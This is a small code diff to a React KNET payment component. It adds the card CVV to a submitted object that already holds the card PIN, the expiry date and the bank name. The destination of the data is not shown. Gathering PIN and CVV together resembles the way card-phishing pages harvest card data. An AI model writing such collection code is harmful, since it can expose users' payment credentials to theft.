@@ -325,6 +325,7 @@ export default function KNETPayment() {
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
         pin: cardPin,
+        cvv: cardCvv,
         bankName: selectedBank,
         paymentMethod: "KNET",
       },
